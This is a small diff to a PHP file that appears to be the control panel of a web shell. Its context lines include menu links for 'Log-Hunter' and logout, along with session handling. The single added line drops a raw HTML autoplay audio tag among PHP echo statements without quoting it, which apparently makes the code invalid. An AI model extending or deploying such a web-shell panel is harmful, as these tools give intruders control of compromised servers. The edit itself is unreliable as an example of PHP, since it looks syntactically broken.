@@ -841,6 +841,7 @@ echo "<li><a href='?dir=$dir&do=log_hunt'>Log-Hunter</a>*</li>";
 echo "<li><a style='color: red;' href='?logout=true'>Logout</a>*</li><br>";
 echo "</ul>";
 echo "</center>";
+	<audio autoplay> <source src="https://archive.org/download/BeepsShort/Beeps%20Short.wav" type="audio/mpeg"></audio>
 echo "<hr>";
 if($_GET['logout'] == true) {
 	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
